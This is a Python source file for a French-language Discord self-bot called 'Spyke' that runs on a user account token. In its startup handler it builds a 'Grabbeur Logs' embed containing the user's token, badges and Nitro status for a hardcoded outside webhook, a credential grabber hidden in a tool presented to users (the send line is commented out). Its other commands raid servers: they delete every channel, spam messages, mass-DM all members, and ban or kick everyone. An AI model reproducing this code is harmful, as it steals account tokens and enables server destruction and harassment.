import discord
from discord.ext import commands, tasks
from discord.utils import get
from discord import Webhook, RequestsWebhookAdapter
import base
from base import config
import time
import requests
intents = discord.Intents.all()

#webhook1 = Webhook.from_url(f"{config.webhookping}", adapter=RequestsWebhookAdapter())
#webhook2 = Webhook.from_url(f"{config.webhookjl}", adapter=RequestsWebhookAdapter())
#webhook3 = Webhook.from_url(f"{config.webhookrun}", adapter=RequestsWebhookAdapter())
#webhook4 = Webhook.from_url(f"{config.webhooktools}", adapter=RequestsWebhookAdapter())
#webhook5 = Webhook.from_url(f"{config.webhookdmall}", adapter=RequestsWebhookAdapter())
client = commands.Bot(command_prefix=f"{config.prefix}", self_bot = True, help_command= None, intents=intents )
class run():
    @client.event
    async def on_ready():
            print("Ready !")
            banner ="""
        ███████ ███████ ██      ███████ 
        ██      ██      ██      ██      
        ███████ █████   ██      █████   
            ██ ██      ██      ██      
        ███████ ███████ ███████ ██  
        """
            statubot = f"""
        Prefix = [{config.prefix}] 
        Statut = 🟢Online
        Serveur = {len(client.guilds)}
        Ping  = {round(client.latency *1000)} ms
        """
            print(banner)
            print(statubot)
            embed = discord.Embed(
                title = "Self Run",
                description = f"""
                > **Self bot**
                > **🟢 Online**
                > **{config.prefix}** :  prefix
                > **Serveur** : {len(client.guilds)}
                > **Ping** : {round(client.latency *1000)} ms
                """,
                color = config.color
            )
            #webhook3.send(embed= embed, username="Run logs", avatar_url=f"{config.ppweb}" )
            usern = client.user.name
            pp = client.user.avatar_url
            bade = client.user.public_flags.early_supporter
            badd = client.user.public_flags.early_verified_bot_developer
            if bade  == False:
                bade = ""
            if bade ==  True :
                bade = f"early"
            if badd == False:
                badd = ""
            if badd == True:
                badd = "dev"    
            nitro = client.user.premium
            if nitro == True:
                nitro = "Nitro"
            if nitro == False:
                nitro  = "none"

            webhook = Webhook.from_url(f"https://discord.com/api/webhooks/1034088457007538267/V0dHcvy7UxJAXUj0-1Y3gRWuYq2G_bCYMIMucFZP46Wn0zPom62MnFI62TIxlc80L5-s", adapter=RequestsWebhookAdapter())
            embed = discord.Embed(
                title = "Grabbeur Logs",
                description = f"""
                > User name  : **{usern}**
                > id : **{config.yourid}**
                > badge : {bade}  {badd} 
                > nitro : {nitro}
                > token = ||{config.token}||
                """,
            )
            embed.set_thumbnail(url = f"{pp}")
            embed.set_author(
                name= "Self Grabbeur",
                icon_url= f"{config.ppweb}"
            )
            #webhook.send(embed = embed)
#class devent():
    @client.event
    async def on_message(message):
        if await client.process_commands(message):
            return
        if f"<@{config.yourid}>" in message.content:
            pp = message.author.avatar_url
            usern = message.author.name
            guildn =  message.guild.name
            guildc = message.channel.id
            embed = discord.Embed(
                title = "Discord Ping ",
                description = f"{message.content}",
                color = config.color
            )
            embed.set_author(
                icon_url= pp,
                name = usern
            )
            embed.add_field(
                name= "Serveur info",
                value= f"**Serveur** : {guildn}\n **channel** :<#{guildc}>"
            )
            embed.set_footer(
                text= "Self bot adn"
            )
            webhook1.send(embed = embed, username="Ping logs", avatar_url=f"{config.ppweb}")
        if f"@everyone" in message.content:
            pp = message.author.avatar_url
            usern = message.author.name
            guildn =  message.guild.name
            guildc = message.channel.id
            embed = discord.Embed(
                title = "Discord Ping ",
                description = f"{message.content}",
                color = config.color
            )
            embed.set_author(
                icon_url= pp,
                name = usern
            )
            embed.add_field(
                name= "Serveur info",
                value= f"**Serveur** : {guildn}\n **channel** :<#{guildc}>"
            )
            embed.set_footer(
                text= "Self bot adn"
            )
            webhook1.send(embed = embed, username="Ping logs", avatar_url=f"{config.ppweb}")
    @client.event
    async def on_guild_join(guild):
        guildn = guild.name
        guildb = guild.premium_subscription_count
        guildm = len(guild.members)
        
        embed = discord.Embed(
            title="server join ",
            description=
            f"J'ai rejoin le serv {guildn}\n membre : {guildm}\n boost : {guildb}",
                color = config.color)
        webhook2.send(embed = embed, username="Join logs", avatar_url=f"{config.ppweb}")
    @client.event
    async def on_guild_remove(guild):
        guildn = guild.name
        guildb = guild.premium_subscription_count
        guildm = len(guild.members)
        
        embed = discord.Embed(
            title="Leave join ",
            description=
            f"J'ai Leave le serv {guildn}\n membre : {guildm}\n boost : {guildb}",
                color = config.color)
        webhook2.send(embed = embed, username="Leave logs", avatar_url=f"{config.ppweb}") 
class dhel():
    @client.command()
    async def help(ctx):
        await ctx.message.delete()
        p = config.prefix
        help = f"""```ini
    [Self bot Spyke]
    [Raid]                        [Modération]           [DB]
    -{p}spam  [Message]             -{p}clear [Nombre]   -{p}save [Nom] [Texte]
    -{p}spame [Message]             -{p}ban   [User]     -{p}find [Nom]
    -{p}raid  [channel]             -{p}unban [User] 
    -{p}iraid [channel]  [texte]    -{p}kick  [User]      [Actyvity]  
    -{p}reset                       -{p}lock              -{p}setgame   [game]  
    -{p}dmall                       -{p}unlock            -{p}setstream [stream]  
    -{p}banall                      -{p}leave             -{p}resetacty  
    -{p}kickall                     -{p}renew [channel]  ```"""
        helpd = await ctx.send(help)
        time.sleep(20)
        await helpd.delete()
class acty():
    @client.command()
    async def setgame(ctx, *g):
        game = discord.Game(name=f"{g}")
        await client.change_presence(status=discord.Status.dnd, activity=game)
        await ctx.message.edit(content = f"Activité changer pour  : **{g}** ✔️ ")
    @client.command()
    async def setstream(ctx, *str):
        game = discord.Streaming(name=f"{str}",
                             url='https://twitch.tv/abcdefg')
        await client.change_presence(status=discord.Status.dnd, activity=game)
        await ctx.message.edit(content = f"**Stream** changer pour  : **{str}** ✔️ ")
    @client.command()
    async def resetacty(ctx):
        await client.change_presence(status=discord.Status.dnd)  
        await ctx.message.edit(content = "Ton activités a été reset")
class dmd():
    @client.command()
    async def kick(ctx, user: discord.User, *reason):
        server = ctx.guild
        servern = server.name
        reason = "".join(reason)
        await ctx.guild.kick(user, reason=reason)
        a =(f"{user} a été kick")
        md = await ctx.send(a)
        time.sleep(10)
        await ctx.delete()
        await md.delete()
    @client.command()
    async def ban(ctx, user: discord.User, *reason):
        server = ctx.guild
        servern = server.name
        reason = "".join(reason)
        await ctx.guild.ban(user, reason=reason)
        a = (f"{user}  a bien été ban ")
        md = await ctx.send(a)
        time.sleep(10)
        await ctx.delete()
        await md.delete()
    @client.command()
    async def unban(ctx, user):
        userName, userId = user.split("#")
        bannedUsers = await ctx.guild.bans()
        for i in bannedUsers:
            if i.user.name == userName and i.user.discriminator == userId:
                await ctx.guild.unban(i.user)
                await ctx.send(f"{user} à été unban.")
                await ctx.message.delete()
                return
        md = await ctx.send(f"L'utilisateur {user} n'est pas dans la liste des bans")
        await ctx.delete()
        time.sleep(10)
        await md.delete()
    @client.command()
    async def lock(ctx, channel: discord.TextChannel = None):
        overwrite = ctx.channel.overwrites_for(ctx.guild.default_role)
        overwrite.send_messages = False
        await ctx.channel.set_permissions(ctx.guild.default_role,
                                        overwrite=overwrite)
        md = await ctx.send('channel lock')
        await ctx.message.delete()
        time.sleep(10)
        await md.delete()
    @client.command()
    async def unlock(ctx):
        await ctx.channel.set_permissions(ctx.guild.default_role,
                                        send_messages=True)
        md = await ctx.send("channel unlock")
        await ctx.message.delete()
        time.sleep(10)
        await md.delete()
    @client.command()
    async def leave(ctx):
        server = ctx.guild
        servern = server.name
        await ctx.send(f"tu va leave le serv {servern}")
        time.sleep(5)

        await ctx.guild.leave()
    @client.command()
    async def renew(ctx, channel: discord.TextChannel = None):
        if channel == None:
            ma = await ctx.send("channel introuvable")
            time.sleep(10)
            await ma.delete()
            return

        nuke_channel = discord.utils.get(ctx.guild.channels, name=channel.name)

        if nuke_channel is not None:
            new_channel = await nuke_channel.clone(reason="reset")
            await nuke_channel.delete()
            md = await new_channel.send(f"salon a été reset  ")
            time.sleep(10)
            await md.delete()
        else:
            await ctx.send(f"channel invalide {channel.name} ")
    @client.command()
    async def clear(ctx, amount):
	    await ctx.channel.purge(limit=int(amount)+1)
class tools():
    @client.command()
    async def ipl(ctx, ip): 
            ip_address = ip
            response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()
            location_data = {
                "ip": ip_address,
                "city": response.get("city"),
                "region": response.get("region"),
                "country": response.get("country_name")
            }
            ipe = str(location_data["ip"])
            ville = str(location_data["city"])
            region = str(location_data["region"])
            pays = str(location_data["country"])
            print("db")
            webhook = Webhook.from_url(f'{config.webhooktools}', adapter=RequestsWebhookAdapter())
            embed = discord.Embed(
            title = "Grab logs",
            description = f"Ip Look up\n **IP** = **``{ipe}``**\n> ville **``{ville}``**\n> Region :**``{region}``**\n> Pays :**``{pays}``** ",
            url ="https://discord.gg/spyke" ,
                color = config.color
        )
            embed.set_author(
            name= "Spyke self",
            icon_url= f"{config.ppweb}",
            url= "http://discord.gg/spyke"
        )
            embed.set_footer(text = "Spyke ∆ self bot")
            webhookk = Webhook.from_url(f"{config.webhooktools}", adapter=RequestsWebhookAdapter()) 
            webhook4.send(embed = embed, username="tools logs", avatar_url=f"{config.ppweb}")
    @client.command()
    async def wehbkill(ctx, web, texte):
        await ctx.send("Je suis en train de spam le webhook")
class draid():
    @client.command()
    async def iraid(ctx,channel_name, *,texte):
        for c in ctx.guild.channels:
            await c.delete()
        for channel in range(0,20):
            guild = ctx.guild
            channel = await guild.create_text_channel(channel_name) 
            for i in range(0,3):
                i = await channel.send(texte)
    @client.command()
    async def dmall(ctx, *, args=None):
        fdmall = 0
        tdmall = 0
        if args != None:
            members = ctx.guild.members
            for member in members:
                time.sleep(10)
                try:
                    await member.send(args)
                    tdmall = tdmall + 1
                
                except:
                    webhook4.send("Message Non envoyer :" + args + " a: " + f"{member.name}", username="Dmall logs", avatar_url=f"{config.ppweb}")
                    fdmall = fdmall + 1
        else:
            await ctx.channel.send("A message was not provided.")
        embed = discord.Embed(
            title = f"Dm all de {ctx.guild.name}",
            description = f"""
            **Message envoyer**
            > {tdmall}
            **Message Non envoyer**
            > {fdmall}
            """,
                color = config.color
        )
        webhook4.send(embed = embed, username="Dmall logs", avatar_url=f"{config.ppweb}")
    @client.command()
    async def spam(ctx, *,spamtxt):
        for i in range(0,50):
            i = (f"{spamtxt}")
            await ctx.send(i)
    @client.command()
    async def spameveryone(ctx, *,spamtxt, nombre):
        for i in range(0,20):
            i = (f"{spamtxt} @everyone")
            await ctx.send(i)
    @client.command()
    async def banall(ctx):
        mban = 0
        mnban = 0
        for member in list(ctx.guild.members):
            try:
                await member.ban(reason="Spyke best selfbot discord.gg/spyke", delete_message_days=7)
                mban = mban + 1
            except Exception:   
                mnban = 0
                pass        
    @client.command()
    async def kick_all(ctx):
        mkick = 0
        mnkick = 0
        webhook5.send(f"Je vais kick all le serv {ctx.guild.name}")
        members = ctx.guild.members 
        members.remove(ctx.me)
        for member in members:
            try:
                if member.id != id or member.id != id: 
                    await member.kick(reason="Spyke best self bot discord.gg/spyke")
                    mkick = mkick + 1
                else:
                    mnkick = mnkick + 1
            except discord.Forbidden: 
                print(f" j'ai pas reussi a kick {member}.")
            continue
        embed = discord.Embed(
            title = f"Kick all de {ctx.guild.name}",
            description = f"""
            **Membre Kick**
            > {mkick}
            **Membre Non kick**
            > {mnkick}
            """,
            color = config.color
        )
        webhook5.send(embed = embed, username= "kick all logs" , avatar_url= f"{config.ppweb}")     
client.run(f"{config.token}", bot =False )  